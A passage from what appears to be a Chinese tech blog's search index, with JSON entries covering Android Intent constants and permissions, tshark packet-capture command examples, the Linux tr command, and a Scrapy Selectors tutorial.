\"android.intent.action.SETTINGS\"\n\n　　String SIGNALSTRENGTHCHANGEDACTION 广播：电话的信号强度已经改变。 \"android.intent.action.SIGSTR\"\n\n　　int SINGLETOPLAUNCH 启动标记：设置以后，如果 activity 已经启动，而且位于历史堆栈的顶端，将不再启动(不重新启动) activity。 2 0x00000002\n\n　　String STATISTICSREPORTACTION 广播：要求 receivers 报告自己的统计信息。 \"android.intent.action.STATISTICSREPORT\"\n\n　　String STATISTICSSTATECHANGEDACTION 广播：统计信息服务的状态已经改变。 \"android.intent.action.STATISTICSSTATECHANGED\"\n\n　String SYNCACTION 动作：执行数据同步。 \"android.intent.action.SYNC\"\n\n　　String TABCATEGORY 类别：这个 activity 应该在 TabActivity 中作为一个 tab 使用。 \"android.intent.category.TAB\"\n\n　　String TEMPLATEEXTRA 附加数据：新记录的初始化模板。 \"android.intent.extra.TEMPLATE\"\n\n　　String TESTCATEGORY 类别：作为测试目的使用，不是正常的用户体验的一部分。 \"android.intent.category.TEST\"\n\n　　String TIMEZONECHANGEDACTION 广播：时区已经改变。 \"android.intent.action.TIMEZONECHANGED\"\n\n　　String TIMECHANGEDACTION 广播：时间已经改变(重新设置)。 \"android.intent.action.TIMESET\"\n\n　　String TIMETICKACTION 广播：当前时间已经变化(正常的时间流逝)。 \"android.intent.action.TIMETICK\"\n\n　　String UMSCONNECTEDACTION 广播：设备进入 USB 大容量存储模式。 \"android.intent.action.UMSCONNECTED\"\n\n　　String UMSDISCONNECTEDACTION 广播：设备从 USB 大容量存储模式退出。 \"android.intent.action.UMSDISCONNECTED\"\n\n　　String UNITTESTCATEGORY 类别：应该被用作单元测试(通过 test harness 运行)。 \"android.intent.category.UNITTEST\"\n\n　　String VIEWACTION 动作：向用户显示数据。 \"android.intent.action.VIEW\"\n\n　　String WALLPAPERCATEGORY 类别：这个 activity 能过为设备设置墙纸。 \"android.intent.category.WALLPAPER\"\n\n　　String WALLPAPERCHANGEDACTION 广播：系统的墙纸已经改变。 \"android.intent.action.WALLPAPERCHANGED\"\n\n　　String WALLPAPERSETTINGSACTION 动作：显示选择墙纸的设置界面。输入：无。 \"android.intent.action.WALLPAPERSETTINGS\"\n\n　　String WEBSEARCHACTION 动作：执行 web 搜索。 \"android.intent.action.WEBSEARCH\"\n\n　　String XMPPCONNECTEDACTION 广播：XMPP 连接已经被建立。 \"android.intent.action.XMPPCONNECTED\"\n\n　　String XMPPDISCONNECTEDACTION 广播：XMPP 连接已经被断开。 \"android.intent.action.XMP\n\nACCESSFINELOCATION、ACCESSLOCATIONEXTRACOMMANDS、ACCESSMOCKLOCATION是有关GPS定位获取的信息\n使用GPS LocationProvider类的相关定位信息必需声明\n  android.permission.ACCESSFINELOCATION、\n  android.permission.ACCESSLOCATIONEXTRACOMMANDS\n  android.permission.ACCESSMOCKLOCATION\n\nACCESSNETWORKSTATE是获取网络状态的权限控制，如果获取当前GSM网络相关信息必需在androidmanifest.xml中声明android.permission.ACCESSNETWORKSTATE这句。\n\nACCESSSURFACEFLINGER是使用SurfaceFlinger底层API的令牌，必需声明android.permission.ACCESSSURFACEFLINGER\n\nACCESSWIFISTATE权限可以获取使用Wi-Fi等WLAN无线网络，加入android.permission.ACCESSWIFISTATE这句\n\nADDSYSTEMSERVICE是系统服务数据库的管理权限，比如添加一个系统服务必需声明android.permission.ADDSYSTEMSERVICE\n\nBATTERYSTATS是获取Android平台上电池设备的权限令牌，必需声明android.permission.BATTERYSTATS才可以获得电池信息\n\nBLUETOOTH蓝牙信息类，获取相关的蓝牙信息必声明android.permission.BLUETOOTH\n\nBLUETOOTHADMIN是蓝牙管理权限包含了身份安全认证，必需添加android.permission.BLUETOOTHADMIN类\n\nBRICK    \"android.permission.BRICK\"\n\nBROADCASTPACKAGEREMOVED是广播包移除类权限，可以移除指定的系统消息，必需声明android.permission.BROADCASTPACKAGEREMOVED这句\n\nBROADCASTSTICKY    \"android.permission.BROADCASTSTICKY\"\n\nCALLPHONE是允许Android手机拨打电话时使用的权限    \"android.permission.CALLPHONE\"\n\nCALLPRIVILEGED    \"android.permission.CALLPRIVILEGED\"\n\nCAMERA是摄像头权限控制，可以管理照相功能的启用    \"android.permission.CAMERA\"\n\nCHANGECOMPONENTENABLEDSTATE    \"android.permission.CHANGECOMPONENTENABLEDSTATE\"\n\nCHANGECONFIGURATION是控制Android系统设置等敏感信息的权限，修改时必需有android.permission.CHANGECONFIGURATION声明。\n\nCHANGENETWORKSTATE    \"android.permission.CHANGENETWORKSTATE\"\n\nCHANGEWIFISTATE是改变WLAN状态的开关，如果打开或关闭Wi-Fi必需加入android.permission.CHANGEWIFISTATE的声明。\n\nCLEARAPPCACHE清除程序缓存也是需要权限的，不要忘了包含android.permission.CLEARAPPCACHE这句\n\nCLEARAPPUSERDATA    \"android.permission.CLEARAPPUSERDATA\"\n\nDELETECACHEFILES    \"android.permission.DELETECACHEFILES\"\n\nDELETEPACKAGES    \"android.permission.DELETEPACKAGES\"\n\nDEVICEPOWER    \"android.permission.DEVICEPOWER\"\n\nDISABLEKEYGUARD    \"android.permission.DISABLEKEYGUARD\"\n\nDUMP    \"android.permission.DUMP\"\n\nEXPANDSTATUSBAR    \"android.permission.EXPANDSTATUSBAR\"\n\nFACTORYTEST    \"android.permission.FACTORYTEST\"  \nFLASHLIGHT    \"android.permission.FLASHLIGHT\"  \nFORCEBACK    \"android.permission.FORCEBACK\"  \nFOTAUPDATE    \"android.permission.FOTAUPDATE\"  \nGETACCOUNTS    \"android.permission.GETACCOUNTS\"  \nGETPACKAGESIZE    \"android.permission.GETPACKAGESIZE\"  \nGETTASKS    \"android.permission.GETTASKS\"  \nHARDWARETEST    \"android.permission.HARDWARETEST\"  \nINJECTEVENTS    \"android.permission.INJECTEVENTS\"  \nINSTALLPACKAGES    \"android.permission.INSTALLPACKAGES\"  \nINTERNALSYSTEMWINDOW    \"android.permission.INTERNALSYSTEMWINDOW\"  \nINTERNET    \"android.permission.INTERNET\"  \nMANAGEAPPTOKENS    \"android.permission.MANAGEAPPTOKENS\"  \nMASTERCLEAR    \"android.permission.MASTERCLEAR\"  \nMODIFYAUDIOSETTINGS    \"android.permission.MODIFYAUDIOSETTINGS\"  \nMODIFYPHONESTATE    \"android.permission.MODIFYPHONESTATE\"  \nMOUNTUNMOUNTFILESYSTEMS    \"android.permission.MOUNTUNMOUNTFILESYSTEMS\"  \nPERSISTENTACTIVITY    \"android.permission.PERSISTENTACTIVITY\"  \nPROCESSOUTGOINGCALLS    \"android.permission.PROCESSOUTGOINGCALLS\"  \nREADCALENDAR    \"android.permission.READCALENDAR\"  \nREADCONTACTS    \"android.permission.READCONTACTS\"  \nREADFRAMEBUFFER    \"android.permission.READFRAMEBUFFER\"  \nREADINPUTSTATE    \"android.permission.READINPUTSTATE\"  \nREADLOGS    \"android.permission.READLOGS\"  \nREADOWNERDATA    \"android.permission.READOWNERDATA\"  \nREADPHONESTATE    \"android.permission.READPHONESTATE\"  \nREADSMS    \"android.permission.READSMS\"  \nREADSYNCSETTINGS    \"android.permission.READSYNCSETTINGS\"  \nREADSYNCSTATS    \"android.permission.READSYNCSTATS\"\n\nRECEIVEBOOTCOMPLETED一般用于自启动程序的声明，当Android系统启动时会发送这个广播，所以自启动程序必需声明android.permission.RECEIVEBOOTCOMPLETED才可以正常运行\n\nRECEIVEMMS    \"android.permission.RECEIVEMMS\"  \nRECEIVESMS    \"android.permission.RECEIVESMS\"  \nRECEIVEWAPPUSH    \"android.permission.RECEIVEWAPPUSH\"  \nRECORDAUDIO    \"android.permission.RECORDAUDIO\"  \nREORDERTASKS    \"android.permission.REORDERTASKS\"  \nRESTARTPACKAGES    \"android.permission.RESTARTPACKAGES\"  \nSENDSMS    \"android.permission.SENDSMS\"  \nSETACTIVITYWATCHER    \"android.permission.SETACTIVITYWATCHER\"  \nSETALWAYSFINISH    \"android.permission.SETALWAYSFINISH\"  \nSETANIMATIONSCALE    \"android.permission.SETANIMATIONSCALE\"  \nSETDEBUGAPP    \"android.permission.SETDEBUGAPP\"  \nSETORIENTATION    \"android.permission.SETORIENTATION\"  \nSETPREFERREDAPPLICATIONS    \"android.permission.SETPREFERREDAPPLICATIONS\"  \nSETPROCESSFOREGROUND    \"android.permission.SETPROCESSFOREGROUND\"  \nSETPROCESSLIMIT    \"android.permission.SETPROCESSLIMIT\"  \nSETTIMEZONE    \"android.permission.SETTIMEZONE\"  \nSETWALLPAPER    \"android.permission.SETWALLPAPER\"  \nSETWALLPAPERHINTS    \"android.permission.SETWALLPAPERHINTS\"  \nSIGNALPERSISTENTPROCESSES    \"android.permission.SIGNALPERSISTENTPROCESSES\"  \nSTATUSBAR    \"android.permission.STATUSBAR\"  \nSYSTEMALERTWINDOW    \"android.permission.SYSTEMALERTWINDOW\"  \nVIBRATE    \"android.permission.VIBRATE\"  \nWAKELOCK    \"android.permission.WAKELOCK\"  \nWRITECALENDAR    \"android.permission.WRITECALENDAR\"  \nWRITECONTACTS    \"android.permission.WRITECONTACTS\"  \nWRITEOWNERDATA    \"android.permission.WRITEOWNERDATA\"  \nWRITESETTINGS    \"android.permission.WRITESETTINGS\"  \nWRITESMS    \"android.permission.WRITESMS\"  \nWRITESYNCSETTINGS    \"android.permission.WRITESYNCSETTINGS\"","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 wireshark","title":"Linux命令 wireshark","text":"//打印http协议流相关信息\ntshark -s 512 -i eth0 -n -f 'tcp dst port 80' -R 'http.host and http.request.uri' -T fields -e http.host -e http.request.uri -l | tr -d '\\t'\n　　注释：\n　　　　-s: 只抓取前512字节；\n　　　　-i: 捕获eth0网卡；\n　　　　-n: 禁止网络对象名称解析;\n　　　　-f: 只捕获协议为tcp,目的端口为80;\n　　　　-R: 过滤出http.host和http.request.uri;\n　　　　-T,-e: 指的是打印这两个字段;\n　　　　-I: 输出到命令行界面;\n//实时打印当前mysql查询语句\ntshark -s 512 -i eth0 -n -f 'tcp dst port 3306' -R 'mysql.query' -T fields -e mysql.query\n　　　注释:\n　　　　-R: 过滤出mysql的查询语句;\n//导出smpp协议header和value的例子\ntshark -r test.cap -R '(smpp.commandid==0x80000004) and (smpp.commandstatus==0x0)' -e smpp.messageid -e frame.time -T fields -E header=y   test.txt\n　　　注释:\n　　　　-r: 读取本地文件，可以先抓包存下来之后再进行分析;\n　　　　-R: smpp...可以在wireshark的过滤表达式里面找到，后面会详细介绍;\n　　　　-E: 当-T字段指定时，设置输出选项，header=y意思是头部要打印;\n　　　　-e: 当-T字段指定时，设置输出哪些字段;\n　　　　   : 重定向;\n//统计http状态\ntshark -n -q -z http,stat, -z http,tree\n　　　注释:\n　　　　-q: 只在结束捕获时输出数据，针对于统计类的命令非常有用;\n　　　　-z: 各类统计选项，具体的参考文档，后面会介绍，可以使用tshark -z help命令来查看所有支持的字段;\n　　　　　　 http,stat: 计算HTTP统计信息，显示的值是HTTP状态代码和HTTP请求方法。\n　　　　　　 http,tree: 计算HTTP包分布。 显示的值是HTTP请求模式和HTTP状态代码。\n//抓取500个包提取访问的网址打印出来\ntshark -s 0 -i eth0 -n -f 'tcp dst port 80' -R 'http.host and http.request.uri' -T fields -e http.host -e http.request.uri -l -c 500\n　　　注释:\n　　　　-f: 抓包前过滤；\n　　　　-R: 抓包后过滤；\n　　　　-l: 在打印结果之前清空缓存;\n　　　　-c: 在抓500个包之后结束;\n//显示ssl data数据\ntshark -n -t a -R ssl -T fields -e \"ip.src\" -e \"ssl.appdata\"\n\n//读取指定报文,按照ssl过滤显示内容\ntshark -r temp.cap -R \"ssl\" -V -T text\n　　注释:\n　　　　-T text: 格式化输出，默认就是text;\n　　　　-V: 增加包的输出;//-q 过滤tcp流13，获取data内容\ntshark -r temp.cap -z \"follow,tcp,ascii,13\"\n\n//按照指定格式显示-e\ntshark -r temp.cap -R ssl -Tfields -e \"ip.src\" -e tcp.srcport -e ip.dst -e tcp.dstport\n\n//输出数据\ntshark -r vmx.cap -q -n -t ad -z follow,tcp,ascii,10.1.8.130:56087,10.195.4.41:446 | more\n　　注释:\n　　　　-t ad: 输出格式化时间戳;\n//过滤包的时间和rtp.seq\ntshark  -i eth0 -f \"udp port 5004\"  -T fields -e frame.timeepoch -e rtp.seq -o rtp.heuristicrtp:true 1  test.txt\n　　注释:\n　　　　-o: 覆盖属性文件设置的一些值;\n\n//提取各协议数据部分\ntshark -r H:/httpsession.pcap -q -n -t ad -z follow,tcp,ascii,71.6.167.142:27017,101.201.42.120:59381 | more\n复制代码\n上面的例子已经涵盖了大部分的选项，下面我针对每一个选项进行简要解释，并给出这个选项常用的值；\n\n3、选项介绍\n\n　　在命令行下可以使用tshark -help得到选项的简单介绍，具体的需要查阅官方文档https://www.wireshark.org/docs/man-pages/tshark.html\n\n复制代码\n捕获接口:\n　　-i: -i interface 指定捕获接口，默认是第一个非本地循环接口;\n　　-f: -f capture filter 设置抓包过滤表达式，遵循libpcap过滤语法，这个实在抓包的过程中过滤，如果是分析本地文件则用不到。\n　　-s: -s snaplen 设置快照长度，用来读取完整的数据包，因为网络中传输有65535的限制，值0代表快照长度65535，默认也是这个值；\n　　-p: 以非混合模式工作，即只关心和本机有关的流量。\n　　-B: -B buffer size 设置缓冲区的大小，只对windows生效，默认是2M;\n　　-y: -ylink type 设置抓包的数据链路层协议，不设置则默认为-L找到的第一个协议，局域网一般是EN10MB等;\n　　-D: 打印接口的列表并退出;\n　　-L 列出本机支持的数据链路层协议，供-y参数使用。\n\n捕获停止选项:\n　　-c: -c packet count 捕获n个包之后结束，默认捕获无限个;\n　　-a: -a autostop cond. ... duration:NUM，在num秒之后停止捕获;\n　　　　　　　　　　　　　　　　　　 filesize:NUM，在numKB之后停止捕获;\n　　　　　　　　　　　　　　　　　   files:NUM，在捕获num个文件之后停止捕获;\n捕获输出选项:\n　　-b ringbuffer opt. ... ring buffer的文件名由-w参数决定,-b参数采用test:value的形式书写;\n　　　　　　　　　　　　　　　　 duration:NUM - 在NUM秒之后切换到下一个文件;\n　　　　　　　　　　　　　　　　 filesize:NUM - 在NUM KB之后切换到下一个文件;\n　　　　　　　　　　　　　　　　 files:NUM - 形成环形缓冲，在NUM文件达到之后;\n\nRPCAP选项:\n　　remote packet capture protocol，远程抓包协议进行抓包；\n　　-A:  -A user:password,使用RPCAP密码进行认证;\n\n输入文件:\n　　-r: -r infile 设置读取本地文件\n\n处理选项:\n　　-2: 执行两次分析\n　　-R: -R read filter,包的读取过滤器，可以在wireshark的filter语法上查看；在wireshark的视图-  过滤器视图，在这一栏点击表达式，就会列出来对所有协议的支持。\n　　-Y: -Y display filter,使用读取过滤器的语法，在单次分析中可以代替-R选项;\n　　-n: 禁止所有地址名字解析（默认为允许所有）\n　　-N: 启用某一层的地址名字解析。“m”代表MAC层，“n”代表网络层，“t”代表传输层，“C”代表当前异步DNS查找。如果-n和-N参数同时存在，-n将被忽略。如果-n和-N参数都不写，则默认打开所有地址名字解析。\n　　-d: 将指定的数据按有关协议解包输出,如要将tcp 8888端口的流量按http解包，应该写为“-d tcp.port==8888,http”;tshark -d. 可以列出所有支持的有效选择器。\n　　\n输出选项:\n　　-w: -w outfile|- 设置raw数据的输出文件。这个参数不设置，tshark将会把解码结果输出到stdout,“-w -”表示把raw输出到stdout。如果要把解码结果输出到文件，使用重定向“  ”而不要-w参数。\n　　-F: -F output file type,设置输出的文件格式，默认是.pcapng,使用tshark -F可列出所有支持的输出文件类型。\n　　-V: 增加细节输出;\n　　-O: -O protocols,只显示此选项指定的协议的详细信息。\n　　-P: 即使将解码结果写入文件中，也打印包的概要信息；\n　　-S: -S separator 行分割符\n　　-x: 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据。\n　　-T: -T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text\n　　-e: 如果-T fields选项指定，-e用来指定输出哪些字段;\n　　-E: -E fieldsoption=value如果-T fields选项指定，使用-E来设置一些属性，比如\n　　　　header=y|n\n　　　　separator=/t|/s|char\n　　　　occurrence=f|l|a\n　　　　aggregator=,|/s|char\n　　-t: -t a|ad|d|dd|e|r|u|ud 设置解码结果的时间格式。“ad”表示带日期的绝对时间，“a”表示不带日期的绝对时间，“r”表示从第一个包到现在的相对时间，“d”表示两个相邻包之间的增量时间（delta）。\n　　-u: s|hms 格式化输出秒；\n　　-l: 在输出每个包之后flush标准输出\n　　-q: 结合-z选项进行使用，来进行统计分析；\n　　-X: key:value 扩展项，luascript、readformat，具体参见 man pages；\n　　-z：统计选项，具体的参考文档;tshark -z help,可以列出，-z选项支持的统计方式。\n　　\n其他选项:\n　　-h: 显示命令行帮助；\n　　-v: 显示tshark 的版本信息;\n\n复制代码\n 4、部分命令测试\n\n　　在第三节我简要介绍了tshark相关的命令，在这一节我们主要测试几个选项的输出结果，来对命令加深理解。对于第三节的命令选项，比较重要的已经用蓝色标出，方便查阅。\n\n　　使用tshark对数据包进行分析，主要是对过滤器的学习，根据自己的需求写出响应的过滤器，来得到相应的数据。\n\n　　针对于我的需求，先抓包在分析，还想将命令行整合进java语言中，然后进行面向对象的分析，那么就需要一些特别的命令来获取一些数据：\n\n复制代码\n//1. 示例1，分析报文封装的协议\n　　C:\\Users\\sdut  tshark -r H:\\httpsession.pcap -T fields -e frame.number -e frame.protocols -E header=y\n　　--输出　　\n　　frame.number    frame.protocols\n　　1       eth:ethertype:ip:tcp\n　　2       eth:ethertype:ip:tcp\n　　3       eth:ethertype:ip:tcp\n　　4       eth:ethertype:ip:tcp:http\n　　5       eth:ethertype:ip:tcp\n　　6       eth:ethertype:ip:tcp:http:data-text-lines\n　　7       eth:ethertype:ip:tcp\n　　8       eth:ethertype:ip:tcp\n　　9       eth:ethertype:ip:tcp\n　　-e frame.number：显示帧序号\n　　-e frame.time: 显示时间，时间格式为 Sep 21, 2016 17:20:02.233249000 中国标准时间\n　　-e frame.protocols: 显示此数据包使用的协议\n　　-e ip.src: 显示源ip，但是不能跟frame一起用\n　　-e ip.dst: 显示目的ip地址；\n　　-e tcp.port: 显示端口号。\n　　......还有很多，针对需求，一方面可以自己通过wireshark软件显示的头部字段来猜测，另一方面可以查阅文档，https://www.wireshark.org/docs/dfref/，这里面列出了所有支持的-e字段写法，可以在里面搜索ip、frame上面我们使用的这几个就会搜到。\n\n//2.示例2\n　　C:\\Users\\sdut  tshark -2 -r H:\\httpsession.pcap -R \"http.request.line || http.filedata || http.response.line\" -T fields -e http.request.line -e http.filedata -e http.response.line -E header=y\n　　输出：该例子输出http协议的请求头，响应头，和响应数据；\n　　http.request.line　　http.file_data　　http.response.line\n　　......　　　　　　　　　　......　　　　　　......\n　　具体的这个-R过滤写法，可以查看文档，根据自己的需求来。https://wiki.wireshark.org/DisplayFilters\n\n......\n复制代码\n5、参考文献\n\n　　tshark官方文档：https://www.wireshark.org/docs/man-pages/tshark.html\n\n　　wireshark wiki：https://wiki.wireshark.org/\n\n　　捕获过滤器 https://wiki.wireshark.org/CaptureFilters\n\n　　显示过滤器，用于display过滤的字段可以通过https://wiki.wireshark.org/DisplayFilters 查询。如果不过滤-e指定的字段数据都会输出，通过-R过滤之后，只有满足规则的才会输出，会因此-R和-T、-e通常会一起使用。\n\n　　统计：https://wiki.wireshark.org/Statistics\n\nFiltering Traffic\n\nYou can use the ip.geoip display filters to filter traffic.\n\nExclude U.S.-based traffic:\n\n ip and not ip.geoip.country == \"United States\"\n\nShow address above the arctic circle:\n\n ip.geoip.lat   \"66.5\"","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 tr","title":"Linux命令 tr","text":"tr用来从标准输入中通过替换或删除操作，进行字符转换。tr主要用于删除文件中控制字符或进行字符转换。使用tr时要转换两个字符串：字符串1用于查询，字符串2用于处理各种转换，tr刚执行时，字符串1中的字符被映射到字符串2中的字符，然后转换操作开始。\n\n1、用法和选项\n用法：\n\ntr [选项]... SET1 [SET2]\n\n说明：\n\ntr命令用于从标准输入中替换、缩减和/或删除字符，并将结果写到标准输出。\n\n选项：\n\n-c, -C, --complement          首先补足SET1\n-d, --delete                    删除匹配SET1 的内容，并不作替换\n-s, --squeeze-repeats   如果匹配于SET1 的字符在输入序列中存在连续的重复，在替换时会被统一缩为一个字符的长度\n-t, --truncate-set1       先将SET1 的长度截为和SET2 相等\n--help                            显示此帮助信息并退出\n--version                       显示版本信息并退出\n2、SET字符串\n\nSET 是一组字符串，一般都可按照字面含义理解。解析序列如下：\n\n\\NNN          #八进制值为NNN 的字符(1 至3 个数位)   \n\\\\            #反斜杠   \n\\a            #终端鸣响   \n\\b            #退格   \n\\f            #换页   \n\\n            #换行   \n\\r            #回车   \n\\t            #水平制表符   \n\\v            #垂直制表符   \n字符1-字符2    #从字符1 到字符2 的升序递增过程中经历的所有字符   \n[字符]       #在SET2 中适用，指定字符会被连续复制直到吻合设置1 的长度   \n[字符次数]    #对字符执行指定次数的复制，若次数以 0 开头则被视为八进制数   \n[:alnum:]     #所有的字母和数字   \n[:alpha:]     #所有的字母   \n[:blank:]     #所有呈水平排列的空白字符   \n[:cntrl:]     #所有的控制字符   \n[:digit:]     #所有的数字   \n[:graph:]     #所有的可打印字符，不包括空格   \n[:lower:]     #所有的小写字母   \n[:print:]     #所有的可打印字符，包括空格   \n[:punct:]     #所有的标点字符   \n[:space:]     #所有呈水平或垂直排列的空白字符   \n[:upper:]     #所有的大写字母   \n[:xdigit:]    #所有的十六进制数   \n[=字符=]       #所有和指定字符相等的字符  \n注意：\n\n1、仅在SET1 和SET2 都给出，同时没有-d 选项的时候才会进行替换。\n\n2、仅在替换时才可能用到-t 选项。如果需要SET2 将被通过在末尾添加原来的末字符的方式补充到同SET1 等长。SET2 中多余的字符将被省略。\n\n3、只有[:lower:] 和[:upper:]以升序展开字符；在用于替换时的SET2 中以成对表示大小写转换。\n\n4、-s 作用于SET1，既不替换也不删除，否则在替换或展开后使用SET2 缩减。\ntr示例：\n1、将文件file中出现的\"abc\"替换为\"xyz\"\n\ncat file | tr \"abc\" \"xyz\"   newfile\n\n【注意】这里，凡是在file中出现的\"a\"字母，都替换成\"x\"字母，\"b\"字母替换为\"y\"字母，\"c\"字母替换为\"z\"字母。而不是将字符串\"abc\"替换为字符串\"xyz\"。\n\n2、使用tr命令“统一”字母大小写\n\n（小写 --  大写）\n cat file | tr [a-z] [A-Z]   newfile\n\n（大写 --  小写）\ncat file | tr [A-Z] [a-z]   newfile\n\n3、把文件中的数字0-9替换为a-j\n\n cat file | tr [0-9] [a-j]   newfile\n\n4、删除文件file中出现的\"Snail\"字符\n\ncat file | tr -d \"Snail\"   newfile\n\n【注意】这里，凡是在file文件中出现的'S','n','a','i','l'字符都会被删除！而不是紧紧删除出现的\"Snail”字符串。\n\n5、删除文件file中出现的换行'\\n'、制表'\\t'字符\n\n cat file | tr -d \"\\n\\t\"   newfile\n\n不可见字符都得用转义字符来表示的，这个都是统一的。\n\n6、删除“连续着的”重复字母，只保留第一个\n\ncat file | tr -s [a-zA-Z]   newfile\n\n7、删除空行\n\n cat file | tr -s \"\\n\"   newfile\n\n8、删除Windows文件“造成”的'^M'字符\n\ncat file | tr -d \"\\r\"   newfile\n或者\n cat file | tr -s \"\\r\" \"\\n\"   newfile\n用 \\n 替换 \\r\n压缩 \\n 只保留一个空行\n【注意】这里-s后面是两个参数\"\\r\"和\"\\n\"，用后者替换前者\n\n9、用空格符\\040替换制表符\\011\n\ncat file | tr -s \"\\011\" \"\\040\"   new_file\n\n10、把路径变量中的冒号\":\"，替换成换行符\"\\n\"\n\n echo $PATH | tr -s \":\" \"\\n\"","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2014-04-30-scrapy-Selectors","title":"scrapy Selectors","text":"原文地址：http://doc.scrapy.org/en/latest/topics/selectors.html\n\n在爬取网页的过程中最常见的任务就是从HTML中提取数据，有很多库可以做到这一点：\n\n BeautifulSoup 缺点：慢\n lxml\n\nscrapy 有自己的机制来提取数据，叫做selectors 因为它们通过xpath或css 选择文档的一部分。\n\nscrapy selectors 构建在lxml之上，也就是说二者在速度和准确性上类似。但是scrapy selectors 的API比lxml的API简单很多，因为lxml除了可用来选择标记文档，还可以干其他很多工作。\n\n使用selectors\n构建selectors\nScrapy selectors 是Selector类的实例。通过传入text或TextResponse 对象构建。它会根据输入类型自动选择最优解析规则（XML还是HTML）\n\n          from scrapy.selector import Selector\n          from scrapy.http import HtmlResponse\n\n由text构建\n\n          body = 'htmlbodyspangood/span/body/html'\n          Selector(text=body).xpath('//span/text()').extract()\n    [u'good']\n\n由response构建\n\n          response = HtmlResponse(url='http://example.com', body=body)\n          Selector(response=response).xpath('//span/text()').extract()\n    [u'good']\n\n简便起见，response对象提供了一个.selector属性，方便引用\n\n          response.selector.xpath('//span/text()').extract()\n    [u'good']\n\n使用selectors\n为了展示如何使用selectors,我们使用scrapy shell (可以利用它的交互来测试)，和一个示例网页，HTML代码如下：\n\n    html\n     head\n      base href='http://example.com/' /\n      titleExample website/title\n     /head\n     body\n      div id='images'\n       a href='image1.html'Name: My image 1 br /img src='image1thumb.jpg' //a\n       a href='image2.html'Name: My image 2 br /img src='image2thumb.jpg' //a\n       a href='image3.html'Name: My image 3 br /img src='image3thumb.jpg' //a\n       a href='image4.html'Name: My image 4 br /img src='image4thumb.jpg' //a\n       a href='image5.html'Name: My image 5 br /img src='image5thumb.jpg' //a\n      /div\n     /body\n    /html\n\n首先，打开shell:\n\n    scrapy shell http://doc.scrapy.org/en/latest/static/selectors-sample1.html\n\nshell 加载完之后，你就可以使用response变量了，它有属性selector。\n\n由于我们解析的是HTML，所以selector会自动使用一个HTML解析器。\n\n我们先通过xpath选择title标签里的文本\n\n          response.selector.xpath('//title/text()')\n    [Selector (text) xpath=//title/text()]\n\n由于通过xpath和css选择太常见了，所以response包含了两个快捷引用：response.xpath()和response.css():\n\n          response.xpath('//title/text()')\n    [Selector (text) xpath=//title/text()]\n          response.css('title::text')\n    [Selector (text) xpath=//title/text()]\n\nxpath()和css()方法会返回一个SelectorList实例，它是一系列新selectors 的列表。这样设计方便你快速选取嵌套的数据。\n\n          response.css('img').xpath('@src').extract()\n    [u'image1thumb.jpg',\n     u'image2thumb.jpg',\n     u'image3thumb.jpg',\n     u'image4thumb.jpg',\n     u'image5thumb.jpg']\n\n为了提取文本数据，你必须调用selector的extract()方法，如下：\n\n          response.xpath('//title/text()').extract()\n    [u'Example website']\n\ncss selectors 可以通过css3伪元素来选择文本或属性节点：\n\n          response.css('title::text').extract()\n    [u'Example website']\n\n下面我们将提取base URL  和一些图片链接\n\n          response.xpath('//base/@href').extract()\n    [u'http://example.com/']\n\n          response.css('base::attr(href)').extract()\n    [u'http://example.com/']\n\n          response.xpath('//a[contains(@href, \"image\")]/@href').extract()\n    [u'image1.html',\n     u'image2.html',\n     u'image3.html',\n     u'image4.html',\n     u'image5.html']\n\n          response.css('a[href=image]::attr(href)').extract()\n    [u'image1.html',\n     u'image2.html',\n     u'image3.html',\n     u'image4.html',\n     u'image5.html']\n\n          response.xpath('//a[contains(@href, \"image\")]/img/@src').extract()\n    [u'image1thumb.jpg',\n     u'image2thumb.jpg',\n     u'image3thumb.jpg',\n     u'image4thumb.jpg',\n     u'image5thumb.jpg']\n\n          response.css('a[href=image] img::attr(src)').extract()\n    [u'image1thumb.jpg',\n     u'image2thumb.jpg',\n     u'image3thumb.jpg',\n     u'image4thumb.jpg',\n     u'image5thumb.jpg']\n\n嵌套selectors\nxpath()和css()返回一个selectors的列表，所以你可以调用这些selector的选取方法，如下：\n\n          links = response.xpath('//a[contains(@href, \"image\")]')\n          links.extract()\n    [u'a href=\"image1.html\"Name: My image 1 brimg src=\"image1thumb.jpg\"/a',\n     u'a href=\"image2.html\"Name: My image 2 brimg src=\"image2thumb.jpg\"/a',\n     u'a href=\"image3.html\"Name: My image 3 brimg src=\"image3thumb.jpg\"/a',\n     u'a href=\"image4.html\"Name: My image 4 brimg src=\"image4thumb.jpg\"/a',\n     u'a href=\"image5.html\"Name: My image 5 brimg src=\"image5thumb.jpg\"/a']\n\n          for index, link in enumerate(links):\n    ... args = (index, link.xpath('@href').extract(), link.xpath('img/@src').extract())\n    ... print 'Link number %d points to url %s and image %s' % args\n\n    Link number 0 points to url [u'image1.html'] and image [u'image1thumb.jpg']\n    Link number 1 points to url [u'image2.html'] and image [u'image2thumb.jpg']\n    Link number 2 points to url [u'image3.html'] and image [u'image3thumb.jpg']\n    Link number 3 points to url [u'image4.html'] and image [u'image4thumb.jpg']\n    Link number 4 points to url [u'image5.html'] and image [u'image5_thumb.jpg']\n\n使用selector的正则\nSelector有一个.re()方法用来在提取数据时使用正则。不像xpath()和css(),re()方法返回一个Unicode字符串，所以你不能构建嵌套的.re()调用。\n\n          response.xpath('//a[contains(@href, \"image\")]/text()').re(r'Name:\\s(.)')\n    [u'My image 1',\n     u'My image 2',\n     u'My image 3',\n     u'My image 4',\n     u'My image 5']\n\n使用相对xpath\n需要记住的是，如果你使用嵌套选择器，用到了以/开头的xpath，那么该xpath will be absolute to the document and not relative to the Selector you’re calling it from\n\n例如：你想提取div元素中所有的p元素。首先，你要得到所有的div：\n\n\t      divs = response.xpath('//div')\n\n接下来，你可能会试图使用下面的方法，下面的方法是错误的，因为它实际上提取的是document下所有的p元素，而不只是那些在div里的元素：\n\n          for p in divs.xpath('//p'):  # this is wrong - gets all p from the whole document\n    ... print p.extract()\n\n正确的方式应该是：注意前缀 .//p\n\n          for p in divs.xpath('.//p'):  # extracts all p inside\n    ... print p.extract()\n\n另一种常见的方式是提取所有直属p子元素\n\n          for p in divs.xpath('p'):\n    ... print p.extract()\n\n使用EXSLT 扩展\n\n一些有关Xpath的tip\nBuilt-in Selectors reference","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 